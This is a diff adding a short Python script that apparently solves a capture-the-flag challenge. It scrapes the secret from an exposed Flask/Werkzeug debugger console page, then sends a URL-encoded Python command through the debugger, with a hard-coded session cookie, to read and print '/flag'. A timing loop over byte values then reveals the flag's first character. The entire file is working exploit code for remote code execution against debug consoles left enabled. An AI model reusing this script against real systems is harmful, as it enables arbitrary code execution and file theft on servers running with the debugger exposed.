@@ -1,0 +1,24 @@
+from urllib import request
+import time
+
+
+#get secret
+url_flask='http://172.26.0.3:5000/console'
+url_flask='http://flask:5000/console'
+url_flask_response = request.urlopen(url_flask)
+html = url_flask_response.read()
+secret=html[476:496].decode("utf-8") 
+
+#flag request
+url='http://flask:5000/console/console?&__debugger__=yes&cmd=f%20%3D%20open(%27%2Fflag%27%2C%27r%27)%3Bprint(f.read())&frm=0&s='+secret
+url_request = request.Request(url)
+url_request.add_header('Cookie' , '__wzd63f4d1edc380f80089a4=1663563879|de44e22b7281')
+url_response = request.urlopen(url_request)
+flag = url_response.read()[58:95]
+for i in range(60,120):
+    if flag[0] == i:
+        print(chr(i))
+        break
+    else:
+        time.sleep(1)
+
